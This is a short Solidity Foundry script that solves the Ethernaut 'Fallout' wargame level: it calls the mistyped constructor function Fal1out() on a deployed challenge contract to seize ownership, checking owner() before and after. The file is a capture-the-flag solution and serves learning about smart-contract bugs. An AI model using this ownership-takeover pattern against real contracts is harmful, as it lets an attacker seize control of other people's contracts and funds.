// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/02_Fallout.sol";

contract ExploitScript is Script {
 
    Fallout level2 = Fallout(payable(0xa32dcd457697CecB9c83aD60C63Fd49F3A3e71c9));

    function run() public {
        vm.startBroadcast();

        level2.owner();
        level2.Fal1out();
        level2.owner();

        vm.stopBroadcast();
    }
    
}

